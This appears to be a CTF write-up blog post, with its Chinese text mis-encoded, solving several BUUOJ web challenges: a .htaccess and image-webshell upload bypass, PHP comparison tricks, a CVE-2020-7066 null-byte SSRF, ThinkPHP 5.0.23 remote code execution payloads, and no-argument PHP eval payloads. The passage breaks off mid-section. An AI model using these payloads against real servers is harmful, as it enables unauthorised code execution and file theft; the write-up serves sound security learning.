{"title":"BUUOJåˆ·é¢˜20201026-31","uid":"1be9c62e526acccb43c839a00721a69f","slug":"BUUOJåˆ·é¢˜20201026-31","date":"2020-10-26T11:30:40.000Z","updated":"2021-06-28T14:58:09.776Z","comments":true,"path":"api/articles/BUUOJåˆ·é¢˜20201026-31.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","content":"<h2 id=\"MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢\"><a href=\"#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢\" class=\"headerlink\" title=\"[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢\"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ ã€å›¾ç‰‡é©¬</p>\n<p>ä¸Šä¼ ç»•è¿‡æ€ä¹ˆç»•å‘¢ï¼Œè¯•äº†ä¸Šä¼ php,php3ï¼Œphp4ï¼Œphtmléƒ½æ˜¯æ²¡è¿‡æ»¤äº†ã€‚è¯•äº†ä¸€ä¸‹jpgå’Œ.htaccessæ–‡ä»¶éƒ½å¯ä»¥ä¸Šä¼ ï¼Œæ‰€ä»¥å°±å¯ä»¥ä½¿ç”¨å›¾ç‰‡é©¬ï¼Œå¹¶ä¸”ç›´æ¥ç»™å‡ºäº†è·¯å¾„ï¼Œå‹å¥½ã€‚</p>\n<p>ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">AddType application&#x2F;x-httpd-php .jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>ç„¶åä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬</p>\n<p>antswordå»è¿æ¥ä¸€ä¸‹å°±å¥½äº†ã€‚     </p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201026201428471.png\" alt=\"image-20201026201428471\"></p>\n<h2 id=\"MRCTF2020-Ez-bypass\"><a href=\"#MRCTF2020-Ez-bypass\" class=\"headerlink\" title=\"[MRCTF2020]Ez_bypass\"></a>[MRCTF2020]Ez_bypass</h2><p>è€ƒç‚¹ï¼šPHPæ¯”è¾ƒç»•è¿‡</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">I</span> put something in <span class=\"token constant\">F12</span> <span class=\"token keyword\">for</span> you\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$id</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$gg</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$gg</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$id</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$gg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You got the first step'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$passwd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                 <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token operator\">==</span><span class=\"token number\">1234567</span><span class=\"token punctuation\">)</span>\n                 <span class=\"token punctuation\">&#123;</span>\n                     <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Good Job!'</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'By Retr_0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token punctuation\">&#125;</span>\n                 <span class=\"token keyword\">else</span>\n                 <span class=\"token punctuation\">&#123;</span>\n                     <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"can you think twice??\"</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You can not get it !'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'only one way to get the flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You are not a real hacker!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Please input first'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>Please input first<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201026202353569.png\" alt=\"image-20201026202353569\"></p>\n<h2 id=\"GKCTF2020-cveç‰ˆç­¾åˆ°\"><a href=\"#GKCTF2020-cveç‰ˆç­¾åˆ°\" class=\"headerlink\" title=\"[GKCTF2020]cveç‰ˆç­¾åˆ°\"></a>[GKCTF2020]cveç‰ˆç­¾åˆ°</h2><p>æç¤ºæ˜¯cve-2020-7066</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>PHPï¼ˆPHPï¼šHypertext Preprocessorï¼ŒPHPï¼šè¶…æ–‡æœ¬é¢„å¤„ç†å™¨ï¼‰æ˜¯PHPGroupå’Œå¼€æ”¾æºä»£ç ç¤¾åŒºçš„å…±åŒç»´æŠ¤çš„ä¸€ç§å¼€æºçš„é€šç”¨è®¡ç®—æœºè„šæœ¬è¯­è¨€ã€‚è¯¥è¯­è¨€ä¸»è¦ç”¨äºWebå¼€å‘ï¼Œæ”¯æŒå¤šç§æ•°æ®åº“åŠæ“ä½œç³»ç»Ÿã€‚ PHP 7.2.29ä¹‹å‰çš„7.2.xç‰ˆæœ¬ã€7.3.16ä¹‹å‰çš„7.3.xç‰ˆæœ¬å’Œ7.4.4ä¹‹å‰çš„7.4.xç‰ˆæœ¬ä¸­çš„â€˜get_headers()â€™å‡½æ•°å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´é€ æˆä¿¡æ¯æ³„éœ²ã€‚</p>\n<p>get_headers()ä¼šæˆªæ–­URLä¸­ç©ºå­—ç¬¦åçš„å†…å®¹</p>\n<p>è¿™æ˜¯åœ¨php7.3ä¸­å‘ç°çš„ ï¼Œä½†æ˜¯ä¸€ç›´æœ‰è¿™ä¸ªæ¼æ´</p>\n<p>æµ‹è¯•è„šæœ¬æ˜¾ç¤ºè¿™ä¼šè®©æ¶æ„è„šæœ¬è·å–æ„å¤–åŸŸåçš„header ã€‚è¿™äº›headerå¯èƒ½æ³„éœ²æ•æ„Ÿä¿¡æ¯æˆ–è€…æ„å¤–åœ°åŒ…å«æ”»å‡»è€…æ§åˆ¶çš„æ•°æ®ã€‚</p></blockquote>\n<p>çœ‹view ctfhubçœ‹åˆ°äº†ä¼ å…¥åˆ°å‚æ•°urlé‡Œäº†ã€‚åº”è¯¥æ˜¯å¯ä»¥ssrfï¼Œä½†æ˜¯ä»–è¯´åªèƒ½ä½¿ç”¨*.ctfhub.com</p>\n<p>HTTPå¤´éƒ¨æ˜¾ç¤ºäº†Flag in localhost</p>\n<p>è¯•ä¸€ä¸‹<a href=\"http://127.0.0.1%00.ctfhub.com\">http://127.0.0.1%00.ctfhub.com</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Array\n(\n    [0] &#x3D;&gt; HTTP&#x2F;1.1 200 OK\n    [1] &#x3D;&gt; Date: Mon, 26 Oct 2020 14:37:44 GMT\n    [2] &#x3D;&gt; Server: Apache&#x2F;2.4.38 (Debian)\n    [3] &#x3D;&gt; X-Powered-By: PHP&#x2F;7.3.15\n    [4] &#x3D;&gt; Tips: Host must be end with &#39;123&#39;\n    [5] &#x3D;&gt; Vary: Accept-Encoding\n    [6] &#x3D;&gt; Content-Length: 113\n    [7] &#x3D;&gt; Connection: close\n    [8] &#x3D;&gt; Content-Type: text&#x2F;html; charset&#x3D;UTF-8\n)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>æç¤ºhostéœ€è¦ä»¥123ç»“å°¾ï¼Œæ‰€ä»¥æ”¹ä¸€ä¸‹</p>\n<p><code>http://127.0.0.123%00.ctfhub.com</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201026223931681.png\" alt=\"image-20201026223931681\"></p>\n<h2 id=\"BJDCTF-2nd-old-hack\"><a href=\"#BJDCTF-2nd-old-hack\" class=\"headerlink\" title=\"[BJDCTF 2nd]old-hack\"></a>[BJDCTF 2nd]old-hack</h2><p>è€ƒç‚¹ï¼šThinkPHP</p>\n<p>è¿™é‡Œä¸Šæ¥å°±æ˜¯æç¤ºTinkPHP5ï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥æ˜¯è¦ä½¿ç”¨ThinkPHP5çš„æ¼æ´æ¥åšã€‚</p>\n<p>å¯ä»¥åˆ°è¿™ä¸ªç½‘ç«™å»æ‰¾paylod:<a href=\"https://www.exploit-db.com/\">https://www.exploit-db.com/</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027100925222.png\" alt=\"image-20201027100925222\"></p>\n<p>é€šè¿‡æŠ¥é”™ä¿¡æ¯å¯ä»¥çŸ¥é“ThinkPHPçš„ç‰ˆæœ¬ä¸º 5.0.23ï¼ŒPHPç‰ˆæœ¬æ˜¯5.6.40ï¼Œä¸€äº›å…³é”®è·¯å¾„ï¼Œwebæ ¹ç›®å½•æ˜¯/var/www/html/ï¼ŒThinkPHPç›®å½•ä¸º/var/www/html/thinkphp</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">thinkphp 5.0.23ï¼ˆå®Œæ•´ç‰ˆï¼‰debugæ¨¡å¼\n32ã€(post)public&#x2F;index.php (data)_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;touch%20&#x2F;tmp&#x2F;xxx\n\nthinkphp 5.0.23(å®Œæ•´ç‰ˆ)\n33ã€ï¼ˆpostï¼‰public&#x2F;index.php?s&#x3D;captcha (data) _method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls -al<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>æ‰¾åˆ°äº†ç›¸åº”payloadï¼Œè¿™é‡Œä¹Ÿå¯ç”¨kaliæ¥æ”¶é›†ä¸€ä¸‹ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027102455420.png\" alt=\"image-20201027102455420\"></p>\n<p>ä¸‹é¢è¯•ä¸€ä¸‹payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;0ab0e6ac-e952-404d-9cbc-dbf6d7ec8902.node3.buuoj.cn&#x2F;?s&#x3D;captcha\n#post data content\n_method&#x3D;__construct&amp;filter%5B%5D&#x3D;system&amp;method&#x3D;get&amp;server%5BREQUEST_METHOD%5D&#x3D;ls+&#x2F;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027102756996.png\" alt=\"image-20201027102756996\"></p>\n<p>æ”¹ç”¨cat /flagï¼Œå°±å¯ä»¥è¯»åˆ°flagã€‚</p>\n<p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯ThinkPHPçš„RCEæ¼æ´ï¼Œè¿™é‡Œå°±è€ƒå¯Ÿåˆ°ä¸€å®šçš„ä¿¡æ¯æ”¶é›†èƒ½åŠ›ï¼Œæ‰¾åˆ°æ¼æ´çš„åˆ©ç”¨payloadçš„æ¯”è¾ƒå…³é”®ã€‚</p>\n<p>å½“ç„¶å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œä¹Ÿå¯ä»¥å†™ä¸€ä¸ªshellè¿›å»ã€‚</p>\n<h2 id=\"GXYCTF2019-ç¦æ­¢å¥—å¨ƒ\"><a href=\"#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ\" class=\"headerlink\" title=\"[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ\"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>è€ƒç‚¹ï¼š.gitæ–‡ä»¶æ³„éœ²ï¼Œæ— å‚æ•°å‡½æ•°RCE</p>\n<p>æ‰“å¼€ç½‘é¡µæ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœ‰ç”¨ä¿¡æ¯ï¼Œä½¿ç”¨dirsearchæ‰«æä¸€ä¸‹åå°çœ‹çœ‹æƒ…å†µï¼Œbuuå¯¹è¯·æ±‚æ•°é‡æœ‰é™åˆ¶ï¼Œè¿™è¦è®¾ç½®å»¶è¿Ÿï¼Œä¸ç„¶ä»€ä¹ˆéƒ½æ”¶é›†ä¸åˆ°ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027104905111.png\" alt=\"image-20201027104905111\"></p>\n<p>ä½¿ç”¨githackæŠŠç›®å½•cloneåˆ°æœ¬åœ°ã€‚</p>\n<p>å¾—åˆ°index.phpçš„æºä»£ç ï¼š</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">';'</span> <span class=\"token operator\">===</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-z,_]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">// echo $_GET['exp'];</span>\n                @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"è¿˜å·®ä¸€ç‚¹å“¦ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"å†å¥½å¥½æƒ³æƒ³ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// highlight_file(__FILE__);</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>åšäº†è¿‡æ»¤äº†ï¼Œdata://ï¼Œfilter://ï¼Œphp://ï¼Œphar://éƒ½è¢«è¿‡æ»¤äº†</p>\n<p>(?R)â€ æ¥è¡¨ç¤ºåµŒå¥—éƒ¨åˆ†ï¼ŒåŒæ—¶è¿˜æ­£åˆ™åŒ¹é…äº†<code>/et|na|info|dec|bin|hex|oct|pi|log/i</code>è¿™å°±ä½¿å¾—å¾ˆå¤šå‡½æ•°ç”¨ä¸äº†ã€‚</p>\n<p>è¿™é‡ŒåŒ¹é…è¦æ±‚å‡½æ•°æ— å‚æ•°ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•æ¥è·å–ä¿¡æ¯ï¼Œæƒ³åŠæ³•è¯»å–flag.phpå†…å®¹ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œåˆ©ç”¨ä¸¤ä¸ªå‡½æ•°çš„åµŒå¥—æ¥ä»£æ›¿<code>.</code></p>\n<p><code>current(localeconv())</code>,å…¶ä¸­localeconv()å‡½æ•°æ˜¯ç”¨æ¥è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</p>\n<p>å‚è€ƒurl:<a href=\"https://www.w3school.com.cn/php/func_string_localeconv.asp\">https://www.w3school.com.cn/php/func_string_localeconv.asp</a></p>\n<p>current()å‡½æ•°çš„ä½œç”¨æ˜¯è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰è¢æœ¯çš„å€¼ï¼Œæ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨æŒ‡é’ˆæŒ‡å‘å®ƒçš„å½“å‰å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027115738515.png\" alt=\"image-20201027115738515\"></p>\n<p>æ‰€ä»¥current(localeconv())å®é™…ä¸Šå°±æ˜¯è¡¨ç¤º<code>.</code>ï¼Œå› æ­¤ä¸€ä¸ªæ— å‚æ•°å‡½æ•°å°±å¯ä»¥æ„å»ºäº†ï¼Œ</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">exp&#x3D;print_r(scandir(current(localeconv())));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027120022472.png\" alt=\"image-20201027120022472\"></p>\n<p>ç›®å½•æƒ…å†µå°±æ˜¯ä¸€ä¸ª.git + flag.php + index.phpäº†ã€‚</p>\n<p>è¿™æ ·å¯ä»¥å¾—åˆ°çš„å°±æ˜¯ä¸€ä¸ªæ•°ç»„ç±»å‹æ•°æ®ï¼Œå€’æ•°ç¬¬äºŒä¸ªå…ƒç´ å°±æ˜¯æˆ‘ä»¬è¦çš„flag.phpï¼Œæ‰€ä»¥æ€è·¯å’Œä¸Šé¢æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå¦‚ä½•è¿”å›å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ å‘¢ï¼Ÿè¿™é‡Œå°±è¦å»æŸ¥ä¸€ä¸‹æ•°ç»„æ“ä½œå‡½æ•°æœ‰å“ªäº›äº†ã€‚</p>\n<p>å‘ç°æœ‰ä¸€ä¸ªå‡½æ•°æ˜¯array_rand():ä»æ•°ç»„ä¸­éšæœºé€‰å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ ï¼Œè¿”å›é”®åã€‚</p>\n<h3 id=\"æ–¹æ³•ä¸€ï¼šlocaleconv\"><a href=\"#æ–¹æ³•ä¸€ï¼šlocaleconv\" class=\"headerlink\" title=\"æ–¹æ³•ä¸€ï¼šlocaleconv()\"></a>æ–¹æ³•ä¸€ï¼šlocaleconv()</h3><p>array_flip():åè½¬/äº¤æ¢æ•°ç»„ä¸­çš„é”®åå’Œå¯¹åº”å…³è”çš„é”®å€¼ã€‚</p>\n<p>å¯ä»¥å…ˆæŠŠé”®å’Œå€¼äº¤æ¢ï¼Œç„¶åç”¨array_rand()éšæœºè¿”å›é”®åï¼Œè¿™æ ·å°±å¯ä»¥è¯»å‡ºflag.php</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">exp&#x3D;show_source(array_rand(array_flip(scandir(current(localeconv())))));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027122156556.png\" alt=\"image-20201027122156556\"></p>\n<h3 id=\"æ–¹æ³•äºŒï¼šreverse\"><a href=\"#æ–¹æ³•äºŒï¼šreverse\" class=\"headerlink\" title=\"æ–¹æ³•äºŒï¼šreverse()\"></a>æ–¹æ³•äºŒï¼šreverse()</h3><p>å…ˆç”¨array_reverse()å‡½æ•°é€†åºæ’åˆ—æ•°ç»„ï¼Œç„¶åç»“åˆnext()å‡½æ•°æŠŠæŒ‡é’ˆåç§»ä¸€ä½ï¼Œå°±å¾—åˆ°flag.phpï¼Œé›†åˆshow_source()å‡½æ•°å°±å¯ä»¥è¯»äº†ã€‚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027122837096.png\" alt=\"image-20201027122837096\"></p>\n<h3 id=\"æ–¹æ³•ä¸‰ï¼šsessionæ–¹æ³•\"><a 